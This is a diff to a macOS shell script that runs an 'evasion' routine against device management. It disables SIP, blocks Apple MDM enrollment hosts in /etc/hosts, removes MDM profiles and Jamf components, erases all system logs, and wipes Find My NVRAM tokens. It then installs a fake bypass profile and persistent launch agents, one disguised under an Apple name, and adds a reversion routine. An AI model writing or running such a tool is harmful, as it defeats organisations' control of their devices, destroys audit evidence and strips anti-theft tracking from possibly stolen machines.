@@ -50,52 +50,119 @@ status_bar() {
     echo "-------------------------------------------------"
 }
 
+# Check if running with required privileges
+check_root() {
+    if [ "$EUID" -ne 0 ]; then
+        echo "[!] Error: This utility requires root privileges." | logmsg
+        echo "[!] Please run with: sudo $0" | logmsg
+        return 1
+    fi
+    return 0
+}
+
+# Verify command exists before use
+check_command() {
+    local cmd=$1
+    if ! command -v "$cmd" >/dev/null 2>&1; then
+        echo "[!] Warning: Command '$cmd' not found." | logmsg
+        return 1
+    fi
+    return 0
+}
+
 evasion() {
     banner
     status_bar "Running Evasion Sequence"
+    
+    # Check for root privileges
+    if ! check_root; then
+        status_bar "Evasion Failed – Root Required"
+        read -r -p "Press Enter to return to menu..."
+        return 1
+    fi
+    
     echo "[*] Disabling SIP + authenticated root..." | logmsg
-    csrutil disable
-    csrutil authenticated-root disable
+    if check_command "csrutil"; then
+        csrutil disable 2>/dev/null || echo "[!] SIP disable may require Recovery Mode." | logmsg
+        csrutil authenticated-root disable 2>/dev/null || echo "[!] Auth-root disable may require Recovery Mode." | logmsg
+    fi
 
-    /usr/bin/mount -uw / || { echo "[!] Mount failed." | logmsg; return; }
+    /usr/bin/mount -uw / 2>/dev/null || { echo "[!] Mount failed – system may be sealed." | logmsg; }
 
     HOSTS="/etc/hosts"
-    [ -f "$HOSTS" ] && cp "$HOSTS" "$HOSTS.backup.$(date +%s)" && echo "[*] Hosts backup saved." | logmsg
+    if [ -f "$HOSTS" ]; then
+        if cp "$HOSTS" "$HOSTS.backup.$(date +%s)" 2>/dev/null; then
+            echo "[*] Hosts backup saved." | logmsg
+        else
+            echo "[!] Warning: Could not backup hosts file." | logmsg
+        fi
+    fi
+    
     for ep in mdmenrollment.apple.com deviceenrollment.apple.com gdmf.apple.com; do
-        grep -q "$ep" "$HOSTS" || echo "127.0.0.1 $ep" >> "$HOSTS"
+        if ! grep -q "$ep" "$HOSTS" 2>/dev/null; then
+            if echo "127.0.0.1 $ep" >> "$HOSTS" 2>/dev/null; then
+                echo "[*] Blocked endpoint: $ep" | logmsg
+            else
+                echo "[!] Warning: Could not modify hosts file for $ep" | logmsg
+            fi
+        fi
     done
 
-    PROFILES=$(/usr/bin/profiles -P | grep "uuid" | awk -F: '{print $2}' | tr -d ' ')
-    for ID in $PROFILES; do
-        echo "[*] Removing $ID..." | logmsg
-        /usr/bin/profiles -R -p "$ID"
-    done
+    if check_command "profiles"; then
+        PROFILES=$(/usr/bin/profiles -P 2>/dev/null | grep "uuid" | awk -F: '{print $2}' | tr -d ' ')
+        if [ -n "$PROFILES" ]; then
+            for ID in $PROFILES; do
+                echo "[*] Removing profile: $ID..." | logmsg
+                /usr/bin/profiles -R -p "$ID" 2>/dev/null || echo "[!] Warning: Could not remove profile $ID" | logmsg
+            done
+        else
+            echo "[*] No MDM profiles found." | logmsg
+        fi
+    fi
 
+    # Check and remove MDM-related launch daemons
     for svc in /Library/LaunchDaemons/*.plist; do
-        if grep -qiE 'jamf|mdm|dep' "$svc"; then
-            launchctl bootout system "$svc"
-            rm -f "$svc"
+        [ -f "$svc" ] || continue
+        if grep -qiE 'jamf|mdm|dep' "$svc" 2>/dev/null; then
+            if check_command "launchctl"; then
+                launchctl bootout system "$svc" 2>/dev/null
+            fi
+            rm -f "$svc" 2>/dev/null
             echo "[*] Disabled rogue daemon: $svc" | logmsg
         fi
     done
 
     for dir in "/usr/local/jamf" "/Library/Application Support/Jamf"; do
-        [ -d "$dir" ] && rm -rf "$dir" && echo "[*] Removed $dir" | logmsg
+        if [ -d "$dir" ]; then
+            if rm -rf "$dir" 2>/dev/null; then
+                echo "[*] Removed $dir" | logmsg
+            else
+                echo "[!] Warning: Could not remove $dir" | logmsg
+            fi
+        fi
     done
 
-    /usr/bin/log erase --all && echo "[*] Logs erased." | logmsg
-    /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
-    /usr/sbin/nvram -c
-
-    # iCloud/FindMy Obfuscation
-    /usr/sbin/nvram -d fmm-mobileme-token-FMM
-    /usr/sbin/nvram -d fmm-computer-name
-    /usr/sbin/nvram -d wifiaddr
-    echo "[*] iCloud FindMy token wiped." | logmsg
+    if check_command "log"; then
+        /usr/bin/log erase --all 2>/dev/null && echo "[*] Logs erased." | logmsg
+    fi
+    
+    if [ -x "/usr/libexec/ApplicationFirewall/socketfilterfw" ]; then
+        /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on 2>/dev/null
+    fi
+    
+    if check_command "nvram"; then
+        /usr/sbin/nvram -c 2>/dev/null
+        
+        # iCloud/FindMy Obfuscation
+        /usr/sbin/nvram -d fmm-mobileme-token-FMM 2>/dev/null
+        /usr/sbin/nvram -d fmm-computer-name 2>/dev/null
+        /usr/sbin/nvram -d wifiaddr 2>/dev/null
+        echo "[*] iCloud FindMy token wiped." | logmsg
+    fi
 
     # Fake Profile Payload
     BYPASS="/tmp/bypass_mdm.mobileconfig"
-    cat <<EOF > "$BYPASS"
+    if cat <<EOF > "$BYPASS" 2>/dev/null
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -126,10 +193,20 @@ evasion() {
 </dict>
 </plist>
 EOF
-    /usr/bin/profiles -I -F "$BYPASS" && echo "[*] Bypass profile installed." | logmsg
+    then
+        if check_command "profiles"; then
+            if /usr/bin/profiles -I -F "$BYPASS" 2>/dev/null; then
+                echo "[*] Bypass profile installed." | logmsg
+            else
+                echo "[!] Warning: Could not install bypass profile." | logmsg
+            fi
+        fi
+    else
+        echo "[!] Warning: Could not create bypass profile." | logmsg
+    fi
 
     # LaunchAgent – Self-Healing Profile Installer
-    cat <<EOF > /Library/LaunchAgents/com.apple.mdmselfheal.plist
+    if cat <<EOF > /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -150,11 +227,20 @@ EOF
 </dict>
 </plist>
 EOF
-    launchctl load /Library/LaunchAgents/com.apple.mdmselfheal.plist
-    echo "[*] Self-healing agent loaded." | logmsg
+    then
+        if check_command "launchctl"; then
+            if launchctl load /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null; then
+                echo "[*] Self-healing agent loaded." | logmsg
+            else
+                echo "[!] Warning: Could not load self-healing agent." | logmsg
+            fi
+        fi
+    else
+        echo "[!] Warning: Could not create self-healing agent." | logmsg
+    fi
 
     # LaunchDaemon – MDM Watchdog
-    cat <<EOF > /Library/LaunchDaemons/com.watchdog.mdm.plist
+    if cat <<EOF > /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -182,10 +268,21 @@ EOF
 </dict>
 </plist>
 EOF
-    launchctl load /Library/LaunchDaemons/com.watchdog.mdm.plist
-    echo "[*] MDM Watchdog deployed." | logmsg
+    then
+        if check_command "launchctl"; then
+            if launchctl load /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null; then
+                echo "[*] MDM Watchdog deployed." | logmsg
+            else
+                echo "[!] Warning: Could not load MDM watchdog." | logmsg
+            fi
+        fi
+    else
+        echo "[!] Warning: Could not create MDM watchdog." | logmsg
+    fi
 
-    /usr/sbin/bless --mount / --bootefi --create-snapshot && echo "[*] Snapshot created." | logmsg
+    if check_command "bless"; then
+        /usr/sbin/bless --mount / --bootefi --create-snapshot 2>/dev/null && echo "[*] Snapshot created." | logmsg
+    fi
     status_bar "Evasion Complete – Restart Recommended"
     read -r -p "Press Enter to return to menu..."
 }
@@ -193,26 +290,45 @@ EOF
 reversion() {
     banner
     status_bar "Running Reversion Sequence"
-    /usr/bin/profiles -R -p "com.bypass.mdm"
-    /usr/bin/profiles -R -p "com.bypass.config"
+    
+    # Check for root privileges
+    if ! check_root; then
+        status_bar "Reversion Failed – Root Required"
+        read -r -p "Press Enter to return to menu..."
+        return 1
+    fi
+    
+    if check_command "profiles"; then
+        /usr/bin/profiles -R -p "com.bypass.mdm" 2>/dev/null
+        /usr/bin/profiles -R -p "com.bypass.config" 2>/dev/null
+    fi
 
     # Find and restore latest backup using find instead of ls
     LATEST=$(find /etc -maxdepth 1 -name "hosts.backup.*" -type f -print0 2>/dev/null | xargs -0 ls -t 2>/dev/null | head -1)
     if [ -n "$LATEST" ]; then
-        cp "$LATEST" /etc/hosts
-        echo "[*] Hosts restored from backup." | logmsg
+        if cp "$LATEST" /etc/hosts 2>/dev/null; then
+            echo "[*] Hosts restored from backup." | logmsg
+        else
+            echo "[!] Warning: Could not restore hosts file." | logmsg
+        fi
     fi
 
-    csrutil enable
-    csrutil authenticated-root enable
+    if check_command "csrutil"; then
+        csrutil enable 2>/dev/null || echo "[!] SIP enable may require Recovery Mode." | logmsg
+        csrutil authenticated-root enable 2>/dev/null || echo "[!] Auth-root enable may require Recovery Mode." | logmsg
+    fi
 
-    launchctl unload /Library/LaunchAgents/com.apple.mdmselfheal.plist
-    rm -f /Library/LaunchAgents/com.apple.mdmselfheal.plist
+    if check_command "launchctl"; then
+        launchctl unload /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null
+        launchctl unload /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null
+    fi
+    
+    rm -f /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null
+    rm -f /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null
 
-    launchctl unload /Library/LaunchDaemons/com.watchdog.mdm.plist
-    rm -f /Library/LaunchDaemons/com.watchdog.mdm.plist
-
-    /usr/sbin/bless --mount / --bootefi --create-snapshot && echo "[*] Fresh snapshot created." | logmsg
+    if check_command "bless"; then
+        /usr/sbin/bless --mount / --bootefi --create-snapshot 2>/dev/null && echo "[*] Fresh snapshot created." | logmsg
+    fi
 
     status_bar "Reversion Complete – Restart Required"
     read -r -p "Press Enter to return to menu..."
